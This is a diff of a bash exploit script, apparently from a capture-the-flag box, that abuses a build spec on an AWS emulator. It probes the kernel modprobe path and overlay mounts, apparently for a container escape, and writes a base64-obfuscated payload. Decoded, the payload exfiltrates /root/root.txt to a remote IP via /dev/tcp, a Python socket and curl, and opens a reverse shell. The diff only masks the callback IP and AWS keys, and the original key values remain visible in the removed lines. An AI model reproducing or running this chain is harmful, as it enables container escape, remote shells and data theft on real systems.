@@ -1,6 +1,6 @@
 #!/bin/bash
-export AWS_ACCESS_KEY_ID="AKIA7P3R9X4K8M2L5VHN"
-export AWS_SECRET_ACCESS_KEY="dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh"
+export AWS_ACCESS_KEY_ID="REDACTED"
+export AWS_SECRET_ACCESS_KEY="REDACTED"
 export AWS_DEFAULT_REGION="us-east-1"
 export AWS_ENDPOINT_URL="http://floci:4566"
 
@@ -13,7 +13,7 @@ phases:
       - ls -la /proc/sys/kernel/modprobe
       - cat /proc/sys/kernel/modprobe
       - cat /proc/self/status | grep -i cap
-      - echo IyEvYmluL3NoCmNhdCAvcm9vdC9yb290LnR4dCA+IC90bXAvcm9vdGZsYWcudHh0IDI+L2Rldi9udWxsCmJhc2ggLWMgImNhdCAvcm9vdC9yb290LnR4dCA+IC9kZXYvdGNwLzEwLjEwLjE2LjY5LzQ0NDUiIDI+L2Rldi9udWxsCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjkvNDQ0NSAwPiYxIDI+L2Rldi9udWxsCnB5dGhvbjMgLWMgImltcG9ydCBzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgnMTAuMTAuMTYuNjknLDQ0NDUpKTtzLnNlbmQob3BlbignL3Jvb3Qvcm9vdC50eHQnLCdyYicpLnJlYWQoKSk7cy5jbG9zZSgpIiAyPi9kZXYvbnVsbApjdXJsIGh0dHA6Ly8xMC4xMC4xNi42OTo4MDAxL3Jvb3RmbGFnP2Y9JChjYXQgL3Jvb3Qvcm9vdC50eHQpIDI+L2Rldi9udWxs | base64 -d > /tmp/payload.sh
+      - echo IyEvYmluL3NoCmNhdCAvcm9vdC9yb290LnR4dCA+IC90bXAvcm9vdGZsYWcudHh0IDI+L2Rldi9udWxsCmJhc2ggLWMgImNhdCAvcm9vdC9yb290LnR4dCA+IC9kZXYvdGNwLzEwLjEwLjE2LlgvNDQ0NSIgMj4vZGV2L251bGwKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi5YLzQ0NDUgMD4mMSAyPi9kZXYvbnVsbApweXRob24zIC1jICJpbXBvcnQgc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE2LlgnLDQ0NDUpKTtzLnNlbmQob3BlbignL3Jvb3Qvcm9vdC50eHQnLCdyYicpLnJlYWQoKSk7cy5jbG9zZSgpIiAyPi9kZXYvbnVsbApjdXJsIGh0dHA6Ly8xMC4xMC4xNi5YOjgwMDEvcm9vdGZsYWc/Zj0kKGNhdCAvcm9vdC9yb290LnR4dCkgMj4vZGV2L251bGw= | base64 -d > /tmp/payload.sh
       - chmod +x /tmp/payload.sh
       - cat /proc/mounts | grep overlay
       - upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
@@ -21,7 +21,7 @@ phases:
       - cat /proc/sys/kernel/modprobe
       - printf '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x || true
       - echo "DONE"
-      - curl http://10.10.16.69:8000/builddone?status=ok 2>/dev/null || true
+      - curl http://10.10.16.X:8000/builddone?status=ok 2>/dev/null || true
 EOF
 
 python3 -c '
